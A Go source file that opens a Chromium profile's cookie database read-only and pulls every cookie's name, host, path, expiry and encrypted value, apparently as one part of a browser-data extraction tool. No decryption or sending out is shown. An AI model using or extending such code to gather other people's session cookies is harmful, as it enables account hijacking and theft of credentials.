package browsers

import (
	"database/sql"
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	"time"

	_ "modernc.org/sqlite"
)

// Chromium represents the Chromium browser
type Chromium struct {
	MasterKey []byte
}

// Cookie represents a browser cookie
type Cookie struct {
	Name       string
	Value      string
	Host       string
	Path       string
	ExpireDate int64
}
// GetCookies extracts cookies for Chromium-based browsers without decryption
func (c *Chromium) GetCookies(profilePath string) ([]Cookie, error) {
    dbPath := filepath.Join(profilePath, "Network", "Cookies")
    db, err := GetDBConnection(dbPath)
    if err != nil {
        return nil, err
    }
    defer db.Close()

    query := "SELECT name, encrypted_value, host_key, path, expires_utc FROM cookies"
    rows, err := db.Query(query)
    if err != nil {
        return nil, err
    }
    defer rows.Close()

    var cookies []Cookie
    for rows.Next() {
        var (
            name, host, cookiePath string
            encryptedValue         []byte
            expiresUtc             int64
        )
        if err := rows.Scan(&name, &encryptedValue, &host, &cookiePath, &expiresUtc); err != nil {
            fmt.Printf("Error scanning row: %v\n", err)
            continue
        }

        // Store cookies in their encrypted form (no decryption)
        cookies = append(cookies, Cookie{
            Name:       name,
            Value:      base64.StdEncoding.EncodeToString(encryptedValue), // Store encrypted value as base64 string
            Host:       host,
            Path:       cookiePath,
            ExpireDate: expiresUtc,
        })
    }

    return cookies, nil
}

// GetDBConnection creates a connection to the specified SQLite database
func GetDBConnection(dbPath string) (*sql.DB, error) {
    fmt.Printf("Attempting to open database: %s\n", dbPath)

    // Check if the file exists
    if _, err := os.Stat(dbPath); os.IsNotExist(err) {
        return nil, fmt.Errorf("database file does not exist: %s", dbPath)
    }

    // Use shared cache and read-only mode to prevent locking issues
    connectionString := fmt.Sprintf("file:%s?cache=shared&mode=ro", dbPath)

    var db *sql.DB
    var err error
    for i := 0; i < 3; i++ { // Retry logic: Try 3 times
        db, err = sql.Open("sqlite", connectionString)
        if err == nil {
            // Check database connectivity
            err = db.Ping()
            if err == nil {
                fmt.Println("Database connection successful.")
                return db, nil
            }
        }
        fmt.Printf("Attempt %d failed: %v, retrying...\n", i+1, err)
        time.Sleep(time.Second * 2) // Wait before retrying
    }

    return nil, fmt.Errorf("failed to connect to database after 3 attempts: %w", err)
}
